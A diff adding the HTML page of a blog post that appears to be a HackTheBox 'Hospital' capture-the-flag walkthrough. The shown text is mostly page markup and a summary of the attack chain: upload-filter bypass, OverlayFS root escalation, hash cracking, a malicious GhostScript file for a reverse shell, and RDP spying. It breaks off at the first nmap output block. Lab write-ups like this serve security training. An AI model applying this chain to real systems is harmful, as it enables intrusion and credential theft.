@@ -1,0 +1,1678 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Hospital is a medium difficulty windows box with a twist. Newly registered web accounts are allowed to upload files with an incomplete blacklisting feature for security. After bypassing, we enter a Linux virtual environment, where we abuse OverlayFS to escalate to root. Once collecting password hashes from /etc/shadow, a user&#39;s credentials are cracked and we can access the system&#39;s web-based mail service. Another user is expecting a file for GhostScript from our compromised user, so we send a malicious .esp file that will execute a reverse shell. With shell access on the primary system, we can find credentials for our user and spy on their desktop activity via Remote Desktop Protocol. The user reveals the Administrator password, allowing us to authenticate as Administrator.'><title>HackTheBox - Hospital</title>
+
+<link rel='canonical' href='https://yuwenmichael.netlify.app/post/hackthebox-hospital/'>
+
+<link rel="stylesheet" href="/scss/style.min.59703bed5f69041ffba70837d909b8000139e78c5201b54e051ae44c256c2d69.css"><meta property='og:title' content='HackTheBox - Hospital'>
+<meta property='og:description' content='Hospital is a medium difficulty windows box with a twist. Newly registered web accounts are allowed to upload files with an incomplete blacklisting feature for security. After bypassing, we enter a Linux virtual environment, where we abuse OverlayFS to escalate to root. Once collecting password hashes from /etc/shadow, a user&#39;s credentials are cracked and we can access the system&#39;s web-based mail service. Another user is expecting a file for GhostScript from our compromised user, so we send a malicious .esp file that will execute a reverse shell. With shell access on the primary system, we can find credentials for our user and spy on their desktop activity via Remote Desktop Protocol. The user reveals the Administrator password, allowing us to authenticate as Administrator.'>
+<meta property='og:url' content='https://yuwenmichael.netlify.app/post/hackthebox-hospital/'>
+<meta property='og:site_name' content='Spencer&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='PHP' /><meta property='article:tag' content='Upload Filter Bypass' /><meta property='article:tag' content='OverlayFS' /><meta property='article:tag' content='Hashcat' /><meta property='article:tag' content='GhostScript' /><meta property='article:tag' content='RDP' /><meta property='article:published_time' content='2024-04-13T17:57:00-06:00'/><meta property='article:modified_time' content='2024-04-13T17:57:00-06:00'/><meta property='og:image' content='https://yuwenmichael.netlify.app/post/hackthebox-hospital/Hospital.png' />
+<meta name="twitter:title" content="HackTheBox - Hospital">
+<meta name="twitter:description" content="Hospital is a medium difficulty windows box with a twist. Newly registered web accounts are allowed to upload files with an incomplete blacklisting feature for security. After bypassing, we enter a Linux virtual environment, where we abuse OverlayFS to escalate to root. Once collecting password hashes from /etc/shadow, a user&#39;s credentials are cracked and we can access the system&#39;s web-based mail service. Another user is expecting a file for GhostScript from our compromised user, so we send a malicious .esp file that will execute a reverse shell. With shell access on the primary system, we can find credentials for our user and spy on their desktop activity via Remote Desktop Protocol. The user reveals the Administrator password, allowing us to authenticate as Administrator."><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://yuwenmichael.netlify.app/post/hackthebox-hospital/Hospital.png' />
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu9f9ff13576eb7121750203f114cffc3e_12283_300x0_resize_q75_box.jpg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Spencer&#39;s Blog</a></h1>
+            <h2 class="site-description"></h2>
+        </div>
+    </header><ol class="social-menu">
+            
+                <li>
+                    <a 
+                        href='https://github.com/spencerja'
+                        target="_blank"
+                        title="Github"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+    </path>
+</svg>
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://app.hackthebox.com/profile/1202496'
+                        target="_blank"
+                        title="HackTheBox"
+                    >
+                        
+                        
+                            <svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+    preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24" fill="currentColor" stroke="none">
+    <g>
+        <path
+            d="M11.9959.0008a1.1187 1.1187 0 00-.057.002.8993.8993 0 00-.2358.0498.9067.9067 0 00-.1652.079L1.9357 5.675a.889.889 0 00-.4444.7699c0 .006.0004.0128.0006.0192-.0002.007 0 .014 0 .0212V17.556a.889.889 0 00.469.7837l9.5983 5.5416c.018.0102.036.0197.054.0287v.002a.8568.8568 0 00.083.0348c0 .001.01.003.012.004.028.01.056.0177.085.0245.01.001.011.003.016.004.028.006.057.0112.086.0146 0 .0005.01.0009.014.001.03.003.061.005.091.005s.061-.002.091-.005c0-.0005.01-.0009.014-.001a.6831.6831 0 00.086-.0146c.01-.001.011-.002.016-.004a.9404.9404 0 00.085-.0245c0-.001.01-.003.012-.004a.8818.8818 0 00.083-.0347v-.002a1.086 1.086 0 00.054-.0287l9.5986-5.5416a.889.889 0 00.4689-.7837V6.4786c0-.009-.0006-.0172-.0008-.0258h.0003v-.008a.8886.8886 0 00-.3117-.6755c-.01-.008-.019-.0162-.029-.0241 0-.002-.01-.005-.01-.007a.8988.8988 0 00-.1074-.0705L12.4533.1267a.8872.8872 0 00-.4646-.1266zm.01 2.2523c.072 0 .1443.0187.209.056l6.5366 3.774c.2789.161.2789.5633 0 .7243l-6.5367 3.774a.4182.4182 0 01-.4182 0L5.26 6.8074c-.2788-.1609-.2789-.5633 0-.7243l6.5368-3.774a.4193.4193 0 01.209-.056zm-8.0801 6.458a.4145.4145 0 01.215.0565l6.524 3.7666a.417.417 0 01.2086.3612v7.5326c0 .3212-.3477.522-.626.3613l-6.5237-3.7666a.4172.4172 0 01-.2086-.3613V9.1288c0-.2408.1955-.414.4107-.4177zm16.1599 0c.215.004.4107.1768.4107.4177v7.5325c0 .149-.08.2868-.2087.3614l-6.5239 3.7666c-.278.1606-.6258-.0401-.6258-.3614v-7.5325c0-.149.08-.2867.2086-.3613l6.5238-3.7666a.415.415 0 01.2152-.0565z">
+        </path>
+    </g>
+</svg>
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://ctftime.org/team/217710'
+                        target="_blank"
+                        title="Team"
+                    >
+                        
+                        
+                            <svg version="1.0" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 220.000000 200.000000"
+    preserveAspectRatio="xMidYMid meet">
+    <g transform="translate(0.000000,200.000000) scale(0.100000,-0.100000)" fill="currentColor" stroke="none">
+        <path d="M365 1499 c201 -275 365 -503 365 -507 0 -4 -84 -120 -188 -259 -103
+            -139 -263 -355 -356 -480 -93 -125 -173 -229 -178 -231 -45 -19 101 -22 992
+            -22 l1000 0 0 1000 0 1000 -1000 0 -999 0 364 -501z m1310 -509 l0 -305 -312
+            -3 -313 -2 0 310 0 310 313 -2 312 -3 0 -305z" />
+        <path d="M1150 1194 c0 -2 -1 -95 -1 -206 l0 -203 216 -3 215 -2 0 210 0 210
+            -157 0 -158 0 98 -98 c53 -53 97 -101 97 -106 0 -4 -42 -48 -92 -97 l-93 -88
+            -28 26 -27 27 65 66 65 66 -100 101 c-55 55 -100 99 -100 97z" />
+    </g>
+</svg>
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://tryhackme.com/p/spencerj'
+                        target="_blank"
+                        title="TryHackMe"
+                    >
+                        
+                        
+                            <svg role="img" viewBox="0 0 24 24" fill="currentColor"  stroke-width="2" xmlns="http://www.w3.org/2000/svg"  stroke-linecap="round" stroke-linejoin="round">
+    <path d="M10.7048 0c-3.164 0-5.8024 2.2853-6.3563 5.2914C2.0493 5.5007.242 7.4381.242 9.7912c0 2.4918 2.0276 4.5191 4.5195 4.5191h6.7616a.625.625 0 000-1.2497H4.7615c-1.8031 0-3.2698-1.467-3.2698-3.2694 0-1.803 1.4667-3.2696 3.2698-3.2696.6552 0 1.287.1925 1.8274.5576a.6252.6252 0 00.8677-.1676.6251.6251 0 00-.168-.8678c-.5105-.345-1.0806-.5756-1.679-.6895.5105-2.3438 2.6006-4.1046 5.0952-4.1046 2.6578 0 4.8555 1.9984 5.1739 4.571a4.489 4.489 0 00-.488.3043.625.625 0 00-.1412.8724.6256.6256 0 00.8729.1408c.5587-.4036 1.2197-.6166 1.9114-.6166 1.547 0 2.894 1.0973 3.203 2.6102a.6254.6254 0 00.7378.4865c.3378-.0689.556-.3992.4871-.7377-.428-2.091-2.2903-3.6087-4.428-3.6087-.3254 0-.6455.037-.9574.1042C16.5567 2.3282 13.8986 0 10.7048 0zm5.1918 10.6402c-.1805 0-.3345.0358-.462.1078a.913.913 0 00-.3124.2909c-.0803.1215-.139.2635-.1753.4261a2.3894 2.3894 0 00-.0535.5145c0 .1805.0178.3525.0535.5162.0363.1639.095.3075.1753.4312a.909.909 0 00.3124.2964c.1275.0732.2815.11.462.11.1806 0 .3343-.0368.4607-.11a.8974.8974 0 00.3086-.2964c.0792-.1237.1372-.2673.1728-.4312a2.3737 2.3737 0 00.0544-.5162c0-.1807-.018-.3523-.0543-.5145-.0357-.1626-.0937-.3046-.173-.4261a.901.901 0 00-.3085-.2909c-.1264-.072-.28-.1078-.4607-.1078zm6.4864 0c-.1806 0-.3347.0358-.4621.1078a.913.913 0 00-.3125.2909c-.0808.1215-.139.2635-.1753.4261a2.3894 2.3894 0 00-.0535.5145c0 .1805.0178.3525.0535.5162.0364.1639.0945.3075.1753.4312a.909.909 0 00.3125.2964c.1274.0732.2815.11.4621.11.1807 0 .334-.0368.4605-.11a.8974.8974 0 00.3086-.2964c.0793-.1237.1372-.2673.1729-.4312a2.3737 2.3737 0 00.0543-.5162c0-.1807-.018-.3523-.0543-.5145-.0357-.1626-.0936-.3046-.1729-.4261a.9011.9011 0 00-.3086-.2909c-.1265-.072-.2798-.1078-.4605-.1078zm-8.5372.0682l-.8407.6175.3141.4294.4762-.3678v1.8773h.603v-2.5564zm6.4863 0l-.8413.6175.3146.4294.4762-.3678v1.8773h.6031v-2.5564zm-4.4355.4442c.0797 0 .1438.0284.1932.0848.0493.0564.0874.1263.114.2093a1.312 1.312 0 01.0542.2691 2.803 2.803 0 01.014.2637c0 .0818-.0048.1712-.014.2689a1.3044 1.3044 0 01-.0543.2707c-.0265.083-.0646.1529-.1139.2093-.0494.0569-.1135.0852-.1932.0852-.0792 0-.1443-.0283-.1947-.0852-.051-.0564-.09-.1263-.1178-.2093a1.244 1.244 0 01-.0557-.2707 2.7355 2.7355 0 01-.0146-.269c0-.0792.0049-.167.0146-.2636a1.249 1.249 0 01.0557-.269c.0278-.0831.0668-.153.1178-.2094.0504-.0564.1155-.0848.1947-.0848zm6.4864 0c.0793 0 .1436.0284.193.0848.0493.0564.0874.1263.114.2093.0266.083.0444.1732.0543.2691.0092.0966.014.1844.014.2637a2.91 2.91 0 01-.014.2689 1.3176 1.3176 0 01-.0543.2707c-.0266.083-.0647.1529-.114.2093-.0494.0569-.1137.0852-.193.0852-.0791 0-.1444-.0283-.1948-.0852-.051-.0564-.09-.1263-.1176-.2093a1.2445 1.2445 0 01-.056-.2707 2.7355 2.7355 0 01-.0146-.269c0-.0792.0049-.167.0146-.2636a1.2484 1.2484 0 01.056-.269c.0276-.0831.0666-.153.1176-.2094.0504-.0564.1157-.0848.1948-.0848zm-2.1915 3.5112c-.1806 0-.3347.0364-.4621.108a.9076.9076 0 00-.3125.2913c-.0808.1215-.1387.263-.1751.4257a2.3826 2.3826 0 00-.0541.5143c0 .1806.0183.3525.0541.5164.0364.1639.0943.3075.1751.4316a.9092.9092 0 00.3125.2956c.1274.0738.2815.1102.4621.1102.1807 0 .3336-.0364.46-.1102a.8922.8922 0 00.3087-.2956c.0797-.124.1371-.2677.1735-.4316a2.3755 2.3755 0 00.0543-.5164c0-.1801-.018-.352-.0543-.5143-.0364-.1627-.0938-.3042-.1735-.4257a.8904.8904 0 00-.3088-.2913c-.1263-.0716-.2792-.108-.4599-.108zm-6.4016.0684l-.8413.6177.3143.4296.4765-.3684v1.8775h.6033v-2.5564zm2.1252 0l-.8413.6177.314.4296.4768-.3684v1.8775h.6033v-2.5564zm2.116 0l-.8407.6177.3135.4296.4768-.3684v1.8775h.603v-2.5564zm2.1604.4442c.0792 0 .1438.028.1932.085.0493.0565.0874.1265.114.2095.026.083.0444.1725.0537.2691.0097.096.0146.1839.0146.263 0 .082-.0049.1715-.0146.2691a1.3243 1.3243 0 01-.0537.2706c-.0266.083-.0647.153-.114.2095-.0494.0569-.114.085-.1932.085-.0797 0-.1441-.0281-.195-.085-.0506-.0565-.0898-.1265-.1174-.2095a1.2443 1.2443 0 01-.0558-.2706 2.6765 2.6765 0 01-.0146-.269c0-.0792.0048-.1671.0146-.263a1.2413 1.2413 0 01.0558-.2692c.0276-.083.0668-.153.1173-.2095.051-.057.1154-.085.1951-.085zm-6.7291 3.0723c-.1312 0-.243.0264-.3358.0785a.6615.6615 0 00-.2268.2111c-.0586.0885-.1009.1914-.127.3096a1.6979 1.6979 0 00-.0394.3732c0 .1313.013.2562.0394.375.0261.1188.0684.2235.127.313a.6535.6535 0 00.2268.2152c.0927.0532.2046.0797.3358.0797.1307 0 .2424-.0265.334-.0797a.6501.6501 0 00.2241-.2152c.0575-.0895.0996-.1942.1258-.313.026-.1188.039-.2437.039-.375 0-.1306-.013-.2555-.039-.3732-.0262-.1182-.0683-.2211-.1258-.3096a.658.658 0 00-.2241-.2111c-.0916-.0521-.2033-.0785-.334-.0785zm3.0859 0c-.1314 0-.243.0264-.3358.0785a.6612.6612 0 00-.2268.2111c-.0586.0885-.101.1914-.127.3096a1.6895 1.6895 0 00-.0394.3732c0 .1313.0128.2562.0394.375.026.1188.0684.2235.127.313a.6532.6532 0 00.2268.2152c.0927.0532.2044.0797.3358.0797.1307 0 .2423-.0265.334-.0797a.6496.6496 0 00.224-.2152c.0574-.0895.0993-.1942.1258-.313a1.7415 1.7415 0 00.039-.375 1.724 1.724 0 00-.039-.3732c-.0265-.1182-.0684-.2211-.1259-.3096a.6575.6575 0 00-.224-.2111c-.0916-.0521-.2032-.0785-.334-.0785zm5.1077 0c-.1312 0-.2428.0264-.3356.0785a.6612.6612 0 00-.2268.2111c-.0586.0885-.1008.1914-.127.3096a1.6977 1.6977 0 00-.0396.3732c0 .1313.0132.2562.0397.375.0261.1188.0683.2235.127.313a.6532.6532 0 00.2267.2152c.0928.0532.2044.0797.3356.0797.1307 0 .2426-.0265.3342-.0797a.6496.6496 0 00.224-.2152c.0575-.0895.0992-.1942.1259-.313.026-.1188.039-.2437.039-.375 0-.1306-.013-.2555-.039-.3732-.0267-.1182-.0684-.2211-.126-.3096a.6575.6575 0 00-.2239-.2111c-.0916-.0521-.2035-.0785-.3342-.0785zm-6.658.0498l-.611.4487.2279.3112.3462-.2669v1.3627h.4375v-1.8557zm3.0677 0l-.6106.4487.2282.3112.3462-.2669v1.3627h.4377v-1.8557zm5.1082 0l-.6109.4487.2285.3112.346-.2669v1.3627h.4377v-1.8557zm-9.7115.3228c.0575 0 .1041.0205.14.0612.0358.0412.0633.0917.0823.152a.9604.9604 0 01.0397.1952c.007.07.0102.134.0102.1915 0 .0597-.0031.1247-.0102.1952a.954.954 0 01-.0397.197c-.019.0602-.0465.1107-.0824.1519-.0358.0412-.0824.0612-.1399.0612-.058 0-.1053-.02-.1416-.0612-.037-.0412-.065-.0917-.0852-.152a.8863.8863 0 01-.0407-.1969 1.9609 1.9609 0 01-.0108-.1952c0-.0575.0037-.1215.0108-.1915a.893.893 0 01.0407-.1952c.0202-.0603.0483-.1108.0852-.152.0363-.0407.0836-.0612.1416-.0612zm3.0859 0c.0575 0 .1041.0205.14.0612a.421.421 0 01.0821.152.9392.9392 0 01.0397.1952c.007.07.0103.134.0103.1915 0 .0597-.0033.1247-.0103.1952a.9302.9302 0 01-.0397.197.4211.4211 0 01-.0822.1519c-.0358.0412-.0824.0612-.14.0612-.058 0-.1053-.02-.1417-.0612a.4192.4192 0 01-.085-.152.8458.8458 0 01-.0407-.1969 1.9645 1.9645 0 01-.011-.1952c0-.0575.004-.1215.011-.1915a.8487.8487 0 01.0407-.1952.4196.4196 0 01.085-.152c.0364-.0407.0837-.0612.1418-.0612zm5.1077 0c.0575 0 .1044.0205.1402.0612a.421.421 0 01.0822.152.9483.9483 0 01.0398.1952c.007.07.0102.134.0102.1915 0 .0597-.0032.1247-.0102.1952a.9427.9427 0 01-.0398.197.421.421 0 01-.0822.1519c-.0358.0412-.0827.0612-.1402.0612-.058 0-.1051-.02-.1415-.0612-.0368-.0412-.065-.0917-.0857-.152a.9503.9503 0 01-.04-.1969 1.9645 1.9645 0 01-.011-.1952c0-.0575.0039-.1215.011-.1915a.9589.9589 0 01.04-.1952c.0207-.0603.0489-.1108.0857-.152.0363-.0407.0835-.0612.1415-.0612zm-1.6842 1.8138c-.1312 0-.2428.0266-.3356.0787a.659.659 0 00-.2268.211c-.0586.0883-.1008.1914-.127.3097a1.7304 1.7304 0 00-.0396.3733c0 .1312.0137.256.0397.3746.026.119.0683.2237.127.3137a.656.656 0 00.2267.2148c.0928.0532.2044.0797.3356.0797.1307 0 .2426-.0265.3342-.0797a.6475.6475 0 00.224-.2148c.0576-.09.0998-.1948.1259-.3137.026-.1187.039-.2434.039-.3746 0-.1307-.013-.2557-.039-.3733-.0261-.1183-.0683-.2214-.126-.3098a.6504.6504 0 00-.2239-.2109c-.0916-.052-.2035-.0787-.3342-.0787zm3.0627 0c-.1313 0-.243.0266-.3358.0787a.6641.6641 0 00-.2268.211c-.0586.0883-.101.1914-.127.3097a1.7218 1.7218 0 00-.0394.3733c0 .1312.0134.256.0395.3746.026.119.0683.2237.1269.3137a.6609.6609 0 00.2268.2148c.0928.0532.2045.0797.3358.0797s.2424-.0265.334-.0797a.6475.6475 0 00.224-.2148c.0575-.09.1-.1948.1259-.3137a1.7398 1.7398 0 00.0396-.3746c0-.1307-.0135-.2557-.0396-.3733-.026-.1183-.0684-.2214-.126-.3098a.6504.6504 0 00-.2239-.2109c-.0916-.052-.2027-.0787-.334-.0787zm-1.5448.05l-.6109.448.2284.3124.346-.2675v1.3626h.4378v-1.8555zm-1.5179.3228c.0575 0 .1041.0206.14.0613a.4206.4206 0 01.0826.1517.9575.9575 0 01.0396.1953c.007.07.0102.134.0102.1916 0 .0597-.0032.1245-.0102.195a.9512.9512 0 01-.0396.197.4218.4218 0 01-.0826.1519c-.0359.0412-.0825.0612-.14.0612-.058 0-.1052-.02-.1415-.0612-.0368-.0412-.065-.0917-.085-.152a.9149.9149 0 01-.0408-.1969 1.9608 1.9608 0 01-.011-.195c0-.0575.004-.1217.011-.1916a.9232.9232 0 01.0407-.1953c.0202-.0603.0483-.1105.085-.1517.0364-.0407.0836-.0613.1416-.0613zm3.0627 0c.0575 0 .104.0206.1398.0613a.4208.4208 0 01.0826.1517.939.939 0 01.0394.1953c.0071.07.0104.134.0104.1916 0 .0597-.0033.1245-.0104.195a.9296.9296 0 01-.0394.197.4218.4218 0 01-.0826.1519c-.0357.0412-.0823.0612-.1398.0612-.0575 0-.1054-.02-.1417-.0612-.037-.0412-.065-.0917-.085-.152a.9065.9065 0 01-.0408-.1969 1.9495 1.9495 0 01-.0103-.195c0-.0575.0033-.1217.0103-.1916a.9145.9145 0 01.0407-.1953c.02-.0603.0481-.1105.085-.1517.0364-.0407.0843-.0613.1418-.0613zm-9.7123.1855c-.091 0-.1686.0182-.2326.0545a.4563.4563 0 00-.157.146c-.0408.0613-.0702.133-.0881.2149a1.1685 1.1685 0 00-.0271.2587c0 .0907.0086.1773.027.2598.018.082.0474.1546.0881.217a.4589.4589 0 00.157.1487c.064.037.1417.0557.2327.0557.0907 0 .1677-.0188.2311-.0557a.4504.4504 0 00.1558-.1487c.0402-.0624.0688-.135.0873-.217a1.2187 1.2187 0 00.0272-.2598c0-.0911-.0093-.1774-.0272-.2587-.0185-.082-.0471-.1536-.0873-.2148a.4479.4479 0 00-.1558-.146c-.0634-.0364-.1403-.0546-.231-.0546zm1.0519.0346l-.423.3102.1577.2166.2398-.185v.9442h.3037v-1.286zm-1.0519.2236c.0396 0 .0724.0141.0973.0429a.2841.2841 0 01.057.105.689.689 0 01.0276.1352c.0044.0489.007.0927.007.1328 0 .0407-.0027.0862-.007.135a.684.684 0 01-.0277.1362.2845.2845 0 01-.057.1053c-.0248.0288-.0576.043-.0972.043a.1247.1247 0 01-.098-.043.2976.2976 0 01-.0592-.1053.612.612 0 01-.0283-.1361 1.391 1.391 0 01-.0069-.135c0-.0402.0021-.084.007-.1329a.6197.6197 0 01.0282-.1353.2973.2973 0 01.0592-.105.1248.1248 0 01.098-.0428zm3.7749 1.394c-.0907 0-.1681.0178-.2321.0542a.4517.4517 0 00-.1574.1463c-.0407.0608-.07.1326-.088.2144a1.1691 1.1691 0 00-.0276.2587c0 .0905.0092.1774.0277.26.0179.0824.0472.1545.0879.2168a.4562.4562 0 00.1574.1493c.064.0368.1414.0547.232.0547.0912 0 .1683-.0179.2318-.0547a.451.451 0 00.1556-.1493.6636.6636 0 00.0868-.2169 1.1889 1.1889 0 00.0277-.26c0-.0906-.0092-.1773-.0277-.2586-.0179-.0818-.0473-.1536-.0868-.2144a.4461.4461 0 00-.1556-.1463c-.0635-.0364-.1406-.0543-.2317-.0543zm1.0522.034l-.423.3109.1578.2158.2398-.1849v.9444h.3033v-1.2861zm-1.0522.2236c.0401 0 .0726.014.0976.0427a.3008.3008 0 01.057.1054.6431.6431 0 01.027.135 1.31 1.31 0 01.0077.1329c0 .0412-.0027.0863-.0077.135a.655.655 0 01-.027.1367.3066.3066 0 01-.057.1054c-.025.0282-.0575.0421-.0976.0421-.0396 0-.0728-.0139-.0977-.042a.2928.2928 0 01-.0592-.1055.6182.6182 0 01-.028-.1366 1.3641 1.3641 0 01-.0077-.1351c0-.0401.0029-.0841.0077-.1328a.6122.6122 0 01.028-.135.2874.2874 0 01.0592-.1055c.0249-.0287.0581-.0427.0977-.0427z"/>
+</svg>
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+
+        <li >
+            <a href='/' >
+                
+                
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/post' >
+                
+                
+                
+                <span>Posts</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/awards' >
+                
+                
+                
+                <span>Trophy Room</span>
+            </a>
+        </li>
+        
+
+        <div class="menu-bottom-section">
+                <li id="i18n-switch">  
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M4 5h7" />
+  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
+  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
+  <path d="M12 20l4 -9l4 9" />
+  <path d="M19.1 18h-6.2" />
+</svg>
+
+
+
+                    <select name="language" onchange="window.location.href = this.selectedOptions[0].value">
+                        
+                            <option value="https://yuwenmichael.netlify.app/" selected>English</option>
+                        
+                    </select>
+                </li>
+            
+            
+            
+                <li id="dark-mode-toggle">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <span>Dark Mode</span>
+                </li>
+            
+        </div>
+    </ol>
+</aside>
+<main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/post/hackthebox-hospital/">
+                <img src="/post/hackthebox-hospital/Hospital_hu7e3bb3ec151de280cadcbc3ccd76960b_293957_800x0_resize_box_3.png"
+                        srcset="/post/hackthebox-hospital/Hospital_hu7e3bb3ec151de280cadcbc3ccd76960b_293957_800x0_resize_box_3.png 800w, /post/hackthebox-hospital/Hospital_hu7e3bb3ec151de280cadcbc3ccd76960b_293957_1600x0_resize_box_3.png 1600w"
+                        width="800" 
+                        height="606" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Hospital" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/hack-the-box/" >
+                Hack the Box
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/post/hackthebox-hospital/">HackTheBox - Hospital</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            Hospital is a medium difficulty windows box with a twist. Newly registered web accounts are allowed to upload files with an incomplete blacklisting feature for security. After bypassing, we enter a Linux virtual environment, where we abuse OverlayFS to escalate to root. Once collecting password hashes from /etc/shadow, a user&#39;s credentials are cracked and we can access the system&#39;s web-based mail service. Another user is expecting a file for GhostScript from our compromised user, so we send a malicious .esp file that will execute a reverse shell. With shell access on the primary system, we can find credentials for our user and spy on their desktop activity via Remote Desktop Protocol. The user reveals the Administrator password, allowing us to authenticate as Administrator.
+        </h3>
+        
+    </div>
+
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Apr 13, 2024</time>
+            </div>
+        
+
+        
+    </footer>
+    
+
+    
+</div>
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="enumeration">Enumeration</h2>
+<p>Initial nmap:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
